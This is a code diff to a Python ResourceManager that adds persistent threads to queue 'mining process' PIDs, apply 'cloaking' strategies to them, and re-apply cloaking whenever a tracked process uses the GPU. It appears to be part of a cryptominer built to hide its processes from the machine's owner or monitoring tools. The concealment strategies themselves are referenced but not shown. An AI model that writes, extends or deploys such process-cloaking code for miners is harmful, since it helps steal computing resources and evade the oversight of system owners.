@@ -205,6 +205,18 @@ class ResourceManager(IResourceManager):
             self.workers = []
             self.resource_adjustment_queue = queue.Queue()
             
+            # **🥇 SOLUTION 1: Add Persistent Service Architecture** (thêm kiến trúc service liên tục)
+            self._pid_queue = queue.Queue()  # Queue for incoming PIDs from registry
+            self._monitored_processes = {}   # Dict[int, MiningProcess] - processes under cloaking
+            self._monitoring_interval = 30.0  # Monitor every 30 seconds
+            self._last_monitoring_cycle = 0.0
+            self._cloaking_stats = {
+                'processes_cloaked': 0,
+                'cloaking_attempts': 0,
+                'failed_cloakings': 0,
+                'monitoring_cycles': 0
+            }
+            
             # **DirectPIDRegistry Integration** (tích hợp DirectPIDRegistry)
             self._setup_direct_registry_observer()
             
@@ -386,15 +398,33 @@ class ResourceManager(IResourceManager):
     def _start_workers(self):
         """**Start Worker Threads** (khởi động worker threads)"""
         # **Start Resource Adjustment Worker** (khởi động worker điều chỉnh tài nguyên)
-        worker = threading.Thread(
+        resource_worker = threading.Thread(
             target=self.process_resource_adjustments,
             name="ResourceAdjustmentWorker",
             daemon=True
         )
-        worker.start()
-        self.workers.append(worker)
+        resource_worker.start()
+        self.workers.append(resource_worker)
         
-        self.logger.info("Worker threads đã khởi động")
+        # **🥇 SOLUTION 1: Add Persistent Monitoring Thread** (thêm thread giám sát liên tục)
+        monitoring_worker = threading.Thread(
+            target=self._persistent_monitoring_loop,
+            name="ResourceManagerMonitoring",
+            daemon=True
+        )
+        monitoring_worker.start()
+        self.workers.append(monitoring_worker)
+        
+        # **🥇 SOLUTION 1: Add PID Processing Thread** (thêm thread xử lý PID)
+        pid_worker = threading.Thread(
+            target=self._pid_processing_loop,
+            name="PIDProcessingWorker",
+            daemon=True
+        )
+        pid_worker.start()
+        self.workers.append(pid_worker)
+        
+        self.logger.info(f"Worker threads đã khởi động: {len(self.workers)} threads active")
 
 
     def process_resource_adjustments(self):
@@ -471,18 +501,195 @@ class ResourceManager(IResourceManager):
                 cmd=registry_metadata.get('cmd', [])
             )
             
-            # **Trigger Cloaking System** (kích hoạt hệ thống che giấu)
-            self.logger.info(f"🎯 [RM-HANDOFF] Kích hoạt cloaking cho PID {pid}")
-            self.trigger_cloaking(mining_process, 'direct_registry_handoff')
+            # **🥇 SOLUTION 1: Queue PID for Processing** (đưa PID vào queue để xử lý)
+            pid_data = {
+                'pid': pid,
+                'mining_process': mining_process,
+                'registry_metadata': registry_metadata,
+                'timestamp': time.time(),
+                'source': 'direct_registry_handoff'
+            }
             
-            # **Log Success** (ghi log thành công)
-            self.logger.info(f"✅ [RM-HANDOFF] Hoàn thành xử lý PID {pid}")
-            return True
+            try:
+                self._pid_queue.put(pid_data, block=False)
+                self.logger.info(f"✅ [RM-HANDOFF] PID {pid} queued for processing")
+                return True
+            except queue.Full:
+                self.logger.error(f"❌ [RM-HANDOFF] PID queue full, processing immediately for PID {pid}")
+                # Fallback to immediate processing
+                self._process_pid_immediately(pid_data)
+                return True
             
         except Exception as e:
             self.logger.error(f"❌ [RM-HANDOFF] Lỗi xử lý PID {pid}: {e}")
             self.logger.error(f"Registry metadata: {registry_metadata}")
             return False
+
+    def _persistent_monitoring_loop(self):
+        """
+        **🥇 SOLUTION 1: Persistent Monitoring Loop** (vòng lặp giám sát liên tục)
+        
+        Continuous monitoring thread thay thế one-shot initialization.
+        Monitors cloaked processes và ensures cloaking effectiveness.
+        """
+        self.logger.info("🔄 [PERSISTENT] ResourceManager monitoring loop started")
+        
+        while not self._stop_flag:
+            try:
+                current_time = time.time()
+                
+                # **Monitor cloaked processes** (giám sát processes đã cloaked)
+                if current_time - self._last_monitoring_cycle >= self._monitoring_interval:
+                    self._execute_monitoring_cycle(current_time)
+                    self._last_monitoring_cycle = current_time
+                    self._cloaking_stats['monitoring_cycles'] += 1
+                
+                # **Health check** (kiểm tra sức khỏe)
+                if len(self._monitored_processes) > 0:
+                    self.logger.debug(f"🔍 [PERSISTENT] Monitoring {len(self._monitored_processes)} processes")
+                
+                time.sleep(5.0)  # Check every 5 seconds
+                
+            except Exception as e:
+                self.logger.error(f"❌ [PERSISTENT] Monitoring loop error: {e}")
+                time.sleep(10.0)  # Wait longer on error
+        
+        self.logger.info("🔚 [PERSISTENT] ResourceManager monitoring loop stopped")
+    
+    def _pid_processing_loop(self):
+        """
+        **🥇 SOLUTION 1: PID Processing Loop** (vòng lặp xử lý PID)
+        
+        Continuous PID processing thread.
+        Processes queued PIDs từ DirectPIDRegistry và applies cloaking.
+        """
+        self.logger.info("🔄 [PID-PROC] PID processing loop started")
+        
+        while not self._stop_flag:
+            try:
+                # **Get PID from queue** (lấy PID từ queue)
+                try:
+                    pid_data = self._pid_queue.get(timeout=2.0)
+                except queue.Empty:
+                    continue
+                
+                # **Process PID** (xử lý PID)
+                success = self._process_pid_immediately(pid_data)
+                
+                if success:
+                    self.logger.info(f"✅ [PID-PROC] Successfully processed PID {pid_data['pid']}")
+                else:
+                    self.logger.error(f"❌ [PID-PROC] Failed to process PID {pid_data['pid']}")
+                
+                self._pid_queue.task_done()
+                
+            except Exception as e:
+                self.logger.error(f"❌ [PID-PROC] Processing loop error: {e}")
+                time.sleep(1.0)
+        
+        self.logger.info("🔚 [PID-PROC] PID processing loop stopped")
+    
+    def _process_pid_immediately(self, pid_data: Dict[str, Any]) -> bool:
+        """
+        **🥇 SOLUTION 1: Immediate PID Processing** (xử lý PID tức thì)
+        
+        Process a single PID immediately with cloaking application.
+        """
+        try:
+            pid = pid_data['pid']
+            mining_process = pid_data['mining_process']
+            source = pid_data['source']
+            
+            self.logger.info(f"🎯 [IMMEDIATE] Processing PID {pid} from {source}")
+            
+            # **Apply cloaking** (áp dụng cloaking)
+            self.trigger_cloaking(mining_process, source)
+            
+            # **Add to monitored processes** (thêm vào processes được giám sát)
+            self._monitored_processes[pid] = mining_process
+            self._cloaking_stats['processes_cloaked'] += 1
+            
+            self.logger.info(f"✅ [IMMEDIATE] PID {pid} cloaked and added to monitoring")
+            return True
+            
+        except Exception as e:
+            self.logger.error(f"❌ [IMMEDIATE] Failed to process PID {pid_data.get('pid', 'unknown')}: {e}")
+            self._cloaking_stats['failed_cloakings'] += 1
+            return False
+    
+    def _execute_monitoring_cycle(self, current_time: float):
+        """
+        **🥇 SOLUTION 1: Execute Monitoring Cycle** (thực thi chu kỳ giám sát)
+        
+        Run a complete monitoring cycle cho all tracked processes.
+        """
+        try:
+            if not self._monitored_processes:
+                self.logger.debug("📊 [MONITOR] No processes to monitor")
+                return
+            
+            self.logger.info(f"📊 [MONITOR] Starting monitoring cycle for {len(self._monitored_processes)} processes")
+            
+            # **Check process health** (kiểm tra sức khỏe process)
+            dead_pids = []
+            for pid, mining_process in self._monitored_processes.items():
+                try:
+                    # **Verify process still exists** (kiểm tra process vẫn tồn tại)
+                    import psutil
+                    proc = psutil.Process(pid)
+                    
+                    if not proc.is_running():
+                        dead_pids.append(pid)
+                        self.logger.info(f"💀 [MONITOR] Process {pid} is dead, removing from monitoring")
+                    else:
+                        # **Collect metrics** (thu thập metrics)
+                        metrics = self.collect_metrics(mining_process)
+                        self.logger.debug(f"📈 [MONITOR] PID {pid} metrics: GPU={metrics.get('gpu_usage', 0):.1f}%")
+                        
+                        # **Re-apply cloaking if needed** (áp dụng lại cloaking nếu cần)
+                        if metrics.get('gpu_usage', 0) > 0:  # Process is actively using GPU
+                            self._reapply_cloaking_if_needed(mining_process)
+                
+                except (psutil.NoSuchProcess, psutil.AccessDenied):
+                    dead_pids.append(pid)
+                    self.logger.info(f"💀 [MONITOR] Process {pid} no longer accessible, removing")
+                except Exception as e:
+                    self.logger.warning(f"⚠️ [MONITOR] Error checking PID {pid}: {e}")
+            
+            # **Clean up dead processes** (dọn dẹp processes đã chết)
+            for pid in dead_pids:
+                del self._monitored_processes[pid]
+            
+            # **Log monitoring stats** (ghi log thống kê giám sát)
+            self.logger.info(f"📊 [MONITOR] Cycle complete: {len(self._monitored_processes)} active, {len(dead_pids)} removed")
+            self.logger.info(f"📊 [STATS] Cloaked: {self._cloaking_stats['processes_cloaked']}, "
+                           f"Failed: {self._cloaking_stats['failed_cloakings']}, "
+                           f"Cycles: {self._cloaking_stats['monitoring_cycles']}")
+            
+        except Exception as e:
+            self.logger.error(f"❌ [MONITOR] Monitoring cycle failed: {e}")
+    
+    def _reapply_cloaking_if_needed(self, mining_process: MiningProcess):
+        """
+        **🥇 SOLUTION 1: Re-apply Cloaking If Needed** (áp dụng lại cloaking nếu cần)
+        
+        Check if cloaking needs to be reapplied cho process.
+        """
+        try:
+            # **Simple re-application logic** (logic áp dụng lại đơn giản)
+            # In a more sophisticated system, this would check if cloaking is still effective
+            strategies = self._determine_strategies(mining_process)
+            
+            for strategy_name in strategies:
+                if self.shared_resource_manager:
+                    success = self.shared_resource_manager.apply_cloak_strategy(strategy_name, mining_process)
+                    if success:
+                        self.logger.debug(f"🔄 [REAPPLY] Re-applied {strategy_name} to PID {mining_process.pid}")
+                    else:
+                        self.logger.warning(f"⚠️ [REAPPLY] Failed to re-apply {strategy_name} to PID {mining_process.pid}")
+                        
+        except Exception as e:
+            self.logger.error(f"❌ [REAPPLY] Failed to reapply cloaking for PID {mining_process.pid}: {e}")
 
     def stop(self):
         """**Stop ResourceManager** (dừng ResourceManager) - Interface implementation"""
